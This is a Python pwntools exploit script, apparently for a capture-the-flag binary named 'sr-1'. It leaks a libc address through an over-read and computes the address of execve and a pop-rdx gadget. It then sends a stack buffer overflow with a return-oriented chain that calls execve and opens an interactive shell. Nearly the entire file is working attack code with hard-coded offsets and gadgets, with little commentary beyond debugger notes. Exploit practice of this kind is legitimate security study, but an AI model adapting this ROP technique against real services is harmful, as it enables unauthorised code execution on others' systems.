#!/usr/bin/env python
from pwn import *

p = process("./sr-1")

#context.terminal = ['tmux', 'splitw', '-h']
# this will spawn gdb for you (remove this if you do not want gdb)
#gdb.attach(p)

got_of_printf = p.elf.got['puts']
printf_at_plt = p.elf.plt['puts']
input_func = p.elf.symbols['input_func']

print("Got of printf %s" % hex(got_of_printf))
print("Printf@plt %s" % hex(printf_at_plt))
print("input_func() %s" % hex(input_func))

"""
0x0000000000400500  puts@plt
0x0000000000400510  write@plt
0x0000000000400520  read@plt

0x0000000000400681  input_func
0x400020:       "@"
0x0000000000400783 : pop rdi ; ret
0x0000000000400781 : pop rsi ; pop r15 ; ret

offset = 0x5f1168
0x5f1168
0x0000000000001b92 : pop rdx ; ret offset from lib5
"""

'difference between rand and execve is 0xabf40'
offset = 0xabf40
pop_rdi = p64(0x400783)
pop_rsi = p64(0x400781)

p.recv()
p.sendline(str(128 + 8 * 8))
p.recv(128 + 8 * 7)
libc_addr = u64(p.recv(8))
libc_addr &= 0x0000ffffffffffff
print(hex(libc_addr))

libc_execve = libc_addr + offset
print(hex(libc_execve))

#libc_printf = u64(raw_data)
#libc_printf &= 0x0000ffffffffffff
#print("Addr of printf %s" % hex(libc_printf))

"""
$1 = {<text variable, no debug info>} 0xf7d63670 <__printf>
pwndbg> print execve
$2 = {<text variable, no debug info>} 0xf7dca7e0 <execve>
"""
libc_base = libc_execve - 0xcc770
pop_rdx = p64(libc_base + 0x1b92)

buf = "A" * 0x80 + "B" * 8
buf += pop_rdi
# 0x400020:"@"
buf += p64(0x400020)
buf += pop_rsi
buf += p64(0)
buf += p64(0)
buf += pop_rdx
buf += p64(0)
buf += p64(libc_execve)

p.sendline(buf)
p.interactive()
